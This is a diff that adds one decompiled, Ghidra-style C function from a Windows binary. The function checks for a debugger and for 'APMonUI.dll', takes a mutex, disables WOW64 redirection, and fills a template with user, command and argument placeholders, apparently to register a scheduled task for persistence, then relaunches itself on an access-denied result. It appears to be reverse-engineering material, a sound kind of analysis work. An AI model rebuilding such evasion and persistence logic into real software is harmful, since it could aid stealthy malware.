@@ -1,0 +1,275 @@
+
+/* WARNING: Function: __chkstk replaced with injection: alloca_probe */
+/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
+
+ulonglong FUN_1406ed270(void)
+
+{
+  int iVar1;
+  BOOL BVar2;
+  DWORD DVar3;
+  ulonglong uVar4;
+  undefined8 uVar5;
+  LPCSTR pCVar6;
+  longlong lVar7;
+  undefined4 *puVar8;
+  undefined1 local_1278 [32];
+  undefined4 local_1258 [2];
+  undefined1 local_1250 [64];
+  PVOID local_1210 [4];
+  HANDLE local_11f0;
+  undefined1 local_11d0 [64];
+  undefined1 local_1190 [64];
+  undefined1 local_1150 [60];
+  int local_1114;
+  undefined1 local_10f0 [1404];
+  undefined1 local_b74 [36];
+  undefined1 local_b50 [60];
+  undefined1 local_b14 [36];
+  undefined1 local_af0 [60];
+  undefined1 local_ab4 [32];
+  uint local_a94;
+  undefined1 local_a70 [60];
+  undefined1 local_a34 [36];
+  undefined1 local_a10 [64];
+  undefined1 local_9d0 [60];
+  undefined1 local_994 [36];
+  undefined1 local_970 [60];
+  undefined1 local_934 [36];
+  undefined1 local_910 [48];
+  undefined1 *local_8e0;
+  undefined1 local_8c0 [48];
+  undefined1 *local_890;
+  undefined1 local_870 [60];
+  undefined1 local_834 [36];
+  undefined1 local_810 [64];
+  undefined1 local_7d0 [64];
+  undefined1 local_790 [64];
+  undefined1 *local_750;
+  undefined1 local_730 [64];
+  undefined1 local_6f0 [60];
+  undefined1 local_6b4 [36];
+  undefined1 local_690 [64];
+  undefined1 local_650 [64];
+  undefined1 *local_610;
+  undefined1 local_5f0 [64];
+  undefined1 local_5b0 [60];
+  undefined1 local_574 [36];
+  undefined1 local_550 [64];
+  undefined1 local_510 [64];
+  undefined1 local_4d0 [64];
+  undefined1 *local_490;
+  undefined1 local_470 [72];
+  undefined1 local_428 [304];
+  undefined1 local_2f8 [292];
+  undefined1 local_1d4 [36];
+  undefined1 local_1b0 [60];
+  undefined1 local_174 [36];
+  undefined1 local_150 [64];
+  undefined1 local_110 [60];
+  undefined1 local_d4 [36];
+  undefined1 local_b0 [44];
+  undefined4 local_84;
+  undefined8 local_80;
+  undefined8 local_78;
+  undefined8 local_70;
+  undefined8 local_68;
+  undefined8 local_60;
+  undefined8 local_58;
+  undefined8 local_50;
+  undefined8 local_48;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  ulonglong local_20;
+  undefined8 uStack_18;
+  
+  uStack_18 = 0x1406ed27d;
+  puVar8 = local_1258;
+  for (lVar7 = 0x342; lVar7 != 0; lVar7 = lVar7 + -1) {
+    *puVar8 = 0xcccccccc;
+    puVar8 = puVar8 + 1;
+  }
+  local_20 = DAT_1417ff968 ^ (ulonglong)local_1258;
+  __CheckForDebuggerJustMyCode(&DAT_1418fe1c4);
+  thunk_FUN_140704ba0(&LAB_1406a3b79);
+  iVar1 = thunk_FUN_1406eaf30();
+  if (iVar1 == 1) {
+    uVar4 = 3;
+  }
+  else {
+    iVar1 = thunk_FUN_1406ead30("APMonUI.dll");
+    if (iVar1 == 0) {
+      uVar4 = 3;
+    }
+    else {
+      iVar1 = thunk_FUN_1406eaef0();
+      if (iVar1 == 0) {
+        thunk_FUN_1406ed110(local_1250,0x20);
+        thunk_FUN_1406ea590(local_1250,2);
+        uVar5 = FUN_1406e8140(local_b74);
+        pCVar6 = (LPCSTR)thunk_FUN_1406e7650(uVar5);
+        BVar2 = PathFileExistsA(pCVar6);
+        if (BVar2 == 0) {
+          local_84 = thunk_FUN_1406f0880(local_1250);
+          local_80 = thunk_FUN_1406eeb10(local_1250);
+          uVar5 = FUN_1406e84e0(local_b14);
+          uVar5 = thunk_FUN_1406e7650(uVar5);
+          local_78 = thunk_FUN_1406dc000(local_b50,uVar5);
+          local_70 = local_78;
+          local_68 = thunk_FUN_1406ff9e0(local_af0,local_78);
+          local_60 = local_68;
+          local_58 = thunk_FUN_1406db440(local_68);
+          thunk_FUN_1406ffb90(local_58,local_80,local_84);
+          thunk_FUN_1406d7910(local_af0);
+          thunk_FUN_1406d7910(local_b50);
+        }
+        Wow64DisableWow64FsRedirection(local_1210);
+        uVar5 = FUN_1406e88d0(local_ab4);
+        pCVar6 = (LPCSTR)thunk_FUN_1406e73d0(uVar5);
+        local_11f0 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,pCVar6);
+        DVar3 = GetLastError();
+        if (DVar3 == 0xb7) {
+          local_a94 = 7;
+          thunk_FUN_1406e6f40(local_1250);
+          uVar4 = (ulonglong)local_a94;
+        }
+        else {
+          ReleaseMutex(local_11f0);
+          CloseHandle(local_11f0);
+          thunk_FUN_1406ed110(local_11d0,0x20);
+          thunk_FUN_1406ea590(local_11d0,0);
+          uVar5 = FUN_1406e8b80(local_a34);
+          uVar5 = thunk_FUN_1406e7510(uVar5);
+          local_80 = thunk_FUN_1406dc000(local_a70,uVar5);
+          local_78 = local_80;
+          local_70 = thunk_FUN_1406ff9e0(local_a10,local_80);
+          pCVar6 = (LPCSTR)thunk_FUN_1406db440(local_70);
+          CreateDirectoryA(pCVar6,(LPSECURITY_ATTRIBUTES)0x0);
+          thunk_FUN_1406d7910(local_a10);
+          thunk_FUN_1406d7910(local_a70);
+          local_84 = thunk_FUN_1406f0880(local_11d0);
+          local_80 = thunk_FUN_1406eeb10(local_11d0);
+          uVar5 = FUN_1406e8e80(local_994);
+          uVar5 = thunk_FUN_1406e75b0(uVar5);
+          local_78 = thunk_FUN_1406dc000(local_9d0,uVar5);
+          local_70 = local_78;
+          local_68 = thunk_FUN_1406ff9e0(local_970,local_78);
+          local_60 = local_68;
+          local_58 = thunk_FUN_1406db440(local_68);
+          thunk_FUN_1406ffb90(local_58,local_80,local_84);
+          thunk_FUN_1406d7910(local_970);
+          thunk_FUN_1406d7910(local_9d0);
+          thunk_FUN_1406ed110(local_1190,0x20);
+          thunk_FUN_1406ea590(local_1190,1);
+          local_80 = thunk_FUN_1406d6fa0(local_934);
+          local_8e0 = local_910;
+          local_78 = thunk_FUN_1406ef400(local_1190,local_8e0);
+          local_890 = local_8c0;
+          local_70 = local_78;
+          local_68 = thunk_FUN_1406ee3c0(local_1190,local_890);
+          local_60 = local_68;
+          thunk_FUN_1406e1030(local_1150,local_68,local_70,local_80);
+          uVar5 = FUN_1406e91e0(local_834);
+          uVar5 = thunk_FUN_1406e74c0(uVar5);
+          local_80 = thunk_FUN_1406dc000(local_870,uVar5);
+          local_78 = local_80;
+          local_70 = thunk_FUN_1406ff9e0(local_810,local_80);
+          local_68 = local_70;
+          local_60 = local_70;
+          thunk_FUN_1406dc000(local_7d0,"$($UserId)");
+          local_750 = local_790;
+          local_58 = thunk_FUN_1406e47f0(local_750,local_1150);
+          local_50 = local_58;
+          local_48 = thunk_FUN_140702280(local_730,local_58,local_7d0,local_60);
+          thunk_FUN_1406d7c20(local_1150,local_48);
+          thunk_FUN_1406d7910(local_730);
+          thunk_FUN_1406d7910(local_7d0);
+          thunk_FUN_1406d7910(local_810);
+          thunk_FUN_1406d7910(local_870);
+          uVar5 = FUN_1406e9380(local_6b4);
+          uVar5 = thunk_FUN_1406e7650(uVar5);
+          local_80 = thunk_FUN_1406dc000(local_6f0,uVar5);
+          local_78 = local_80;
+          local_70 = local_80;
+          thunk_FUN_1406dc000(local_690,"$($Command)");
+          local_610 = local_650;
+          local_68 = thunk_FUN_1406e47f0(local_610,local_1150);
+          local_60 = local_68;
+          local_58 = thunk_FUN_140702280(local_5f0,local_68,local_690,local_70);
+          thunk_FUN_1406d7c20(local_1150,local_58);
+          thunk_FUN_1406d7910(local_5f0);
+          thunk_FUN_1406d7910(local_690);
+          thunk_FUN_1406d7910(local_6f0);
+          uVar5 = FUN_1406e95d0(local_574);
+          uVar5 = thunk_FUN_1406e7420(uVar5);
+          local_80 = thunk_FUN_1406dc000(local_5b0,uVar5);
+          local_78 = local_80;
+          local_70 = thunk_FUN_1406ff9e0(local_550,local_80);
+          local_68 = local_70;
+          local_60 = local_70;
+          thunk_FUN_1406dc000(local_510,"$($Arguments)");
+          local_490 = local_4d0;
+          local_58 = thunk_FUN_1406e47f0(local_490,local_1150);
+          local_50 = local_58;
+          local_48 = thunk_FUN_140702280(local_470,local_58,local_510,local_60);
+          thunk_FUN_1406d7c20(local_1150,local_48);
+          thunk_FUN_1406d7910(local_470);
+          thunk_FUN_1406d7910(local_510);
+          thunk_FUN_1406d7910(local_550);
+          thunk_FUN_1406d7910(local_5b0);
+          uVar5 = thunk_FUN_1406db440(local_1150);
+          local_80 = thunk_FUN_1406e3af0(local_428,uVar5);
+          local_78 = local_80;
+          local_70 = thunk_FUN_1406e7220(local_80);
+          uVar5 = FUN_1406e9f00(local_1d4);
+          uVar5 = thunk_FUN_1406e7600(uVar5);
+          local_68 = thunk_FUN_1406e3af0(local_2f8,uVar5);
+          local_60 = local_68;
+          local_58 = thunk_FUN_1406e7220(local_68);
+          local_1114 = thunk_FUN_1406efc30(local_58,local_70);
+          thunk_FUN_1406e6460(local_2f8);
+          thunk_FUN_1406e6460(local_428);
+          if (local_1114 == -0x7ff8fffb) {
+            uVar5 = FUN_1406e7a10(local_174);
+            uVar5 = thunk_FUN_1406e7740(uVar5);
+            local_80 = thunk_FUN_1406dc000(local_1b0,uVar5);
+            local_78 = local_80;
+            local_70 = local_80;
+            local_68 = thunk_FUN_140700500(local_150,0);
+            local_60 = local_68;
+            local_58 = local_68;
+            uVar5 = FUN_1406e7810(local_d4);
+            uVar5 = thunk_FUN_1406e7560(uVar5);
+            local_50 = thunk_FUN_1406dc000(local_110,uVar5);
+            local_48 = local_50;
+            local_40 = local_50;
+            local_38 = thunk_FUN_1406e1470(local_b0,local_50,local_58);
+            local_30 = local_38;
+            local_28 = local_38;
+            thunk_FUN_1406e1470(local_10f0,local_38,local_70);
+            thunk_FUN_1406d7910(local_b0);
+            thunk_FUN_1406d7910(local_110);
+            thunk_FUN_1406d7910(local_150);
+            thunk_FUN_1406d7910(local_1b0);
+            uVar5 = thunk_FUN_1406d7d20(local_10f0,0);
+            thunk_FUN_1406fe8d0(uVar5,0);
+                    /* WARNING: Subroutine does not return */
+            exit(0);
+          }
+          thunk_FUN_1406d7910(local_1150);
+          thunk_FUN_1406e6f40(local_1190);
+          thunk_FUN_1406e6f40(local_11d0);
+          uVar4 = thunk_FUN_1406e6f40(local_1250);
+        }
+      }
+      else {
+        uVar4 = 5;
+      }
+    }
+  }
+  _RTC_CheckStackVars(local_1278,&DAT_1413c8878);
+  return uVar4;
+}
+
